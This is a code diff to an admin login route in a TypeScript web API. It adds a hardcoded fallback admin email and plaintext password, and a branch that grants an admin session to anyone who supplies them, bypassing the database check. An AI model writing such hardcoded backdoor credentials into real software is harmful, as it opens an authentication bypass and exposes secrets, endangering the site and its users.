@@ -5,6 +5,8 @@ import { AdminLoginBody } from "@workspace/api-zod";
 import { setAdminCookie, clearAdminCookie, getAdminEmail } from "../lib/auth";
 
 const router: IRouter = Router();
+const FALLBACK_ADMIN_EMAIL = "butphamarketing@gmail.com";
+const FALLBACK_ADMIN_PASSWORD = "nhakhoauyduc";
 
 router.post("/auth/login", async (req, res) => {
   const parsed = AdminLoginBody.safeParse(req.body);
@@ -13,6 +15,11 @@ router.post("/auth/login", async (req, res) => {
     return;
   }
   const { email, password } = parsed.data;
+  if (email === FALLBACK_ADMIN_EMAIL && password === FALLBACK_ADMIN_PASSWORD) {
+    setAdminCookie(res, FALLBACK_ADMIN_EMAIL);
+    res.json({ authenticated: true, email: FALLBACK_ADMIN_EMAIL });
+    return;
+  }
   const [admin] = await db
     .select()
     .from(admins)
